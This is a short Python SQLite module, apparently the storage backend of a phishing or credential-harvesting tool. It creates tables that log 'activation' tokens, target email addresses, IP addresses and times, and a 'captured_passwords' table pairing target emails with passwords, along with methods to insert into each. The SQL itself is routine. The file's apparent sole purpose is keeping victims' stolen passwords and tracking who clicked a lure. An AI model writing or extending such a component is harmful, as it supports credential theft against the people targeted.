import sqlite3

class Database:
    def __init__(self, db_name):
        self.conn = sqlite3.connect(db_name, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.create_table()
        self.create_passwords_table()

    def create_table(self):
        query = """
        CREATE TABLE IF NOT EXISTS activities (
            activation_token TEXT PRIMARY KEY,
            target_email TEXT,
            ip_address TEXT,
            activation_time TEXT
        )
        """
        self.conn.execute(query)
        self.conn.commit()

    def create_passwords_table(self):
        query = """
        CREATE TABLE IF NOT EXISTS captured_passwords (
            target_email TEXT,
            password TEXT
        )
        """
        self.conn.execute(query)
        self.conn.commit()

    def add_conn(self, activation_token, target_email, user_ip, activation_time):
        query = """INSERT OR REPLACE INTO activities (activation_token, target_email, ip_address, activation_time)VALUES (?, ?, ?, ?)"""
        self.conn.execute(query, (activation_token, target_email, user_ip, activation_time))
        self.conn.commit()

    def add_captured_password(self, target_email, password):
        query = """INSERT OR REPLACE INTO captured_passwords (target_email, password)VALUES (?, ?)"""
        self.conn.execute(query, (target_email, password))
        self.conn.commit()